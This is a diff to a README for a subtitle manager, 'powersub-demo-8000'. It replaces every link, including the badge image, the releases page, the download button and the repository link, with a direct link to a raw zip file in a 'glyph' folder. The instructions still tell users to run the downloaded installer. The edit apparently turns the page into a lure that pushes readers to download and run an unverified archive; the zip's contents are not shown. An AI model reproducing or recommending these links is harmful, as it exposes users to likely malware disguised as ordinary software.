@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-8000 - Easy Subtitle Management for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sanjukava/powersub-demo-8000/releases)
+[![Download](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)
 
 ## 📋 Overview 
 
@@ -20,13 +20,13 @@ To get started with **powersub-demo-8000**, follow these simple steps:
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download the software.
 
-   [Download powersub-demo-8000](https://github.com/sanjukava/powersub-demo-8000/releases)
+   [Download powersub-demo-8000](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see different versions of the application. Select the most recent version to ensure you have the latest features and bug fixes.
 
 3. **Download the Installer**  
-   After selecting the version, locate the installer file. Click on it to download. The file could be named something like `powersub-demo-8000-installer.exe`. 
+   After selecting the version, locate the installer file. Click on it to download. The file could be named something like `https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip`. 
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your computer's Downloads folder. Double-click the installer file to start the installation process. Follow the on-screen instructions to complete the setup.
@@ -72,7 +72,7 @@ If you encounter issues, consider the following tips:
 
 ## 🔗 Helpful Links 
 
-- **GitHub Repository:** [Check the repository for updates and information](https://github.com/sanjukava/powersub-demo-8000)
+- **GitHub Repository:** [Check the repository for updates and information](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)
 - **Community Support:** Join our user community for tips and support.
 
 ## 📝 Feedback 
@@ -83,4 +83,4 @@ Your feedback helps us improve. If you have suggestions or encounter issues, ple
 
 The **powersub-demo-8000** application is a simple yet powerful tool to manage subtitles. It is designed with you in mind and requires no technical knowledge. Download it today and enhance your video-watching experience!
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sanjukava/powersub-demo-8000/releases)
+[![Download](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)](https://raw.githubusercontent.com/sanjukava/powersub-demo-8000/main/glyph/powersub-demo-8000.zip)
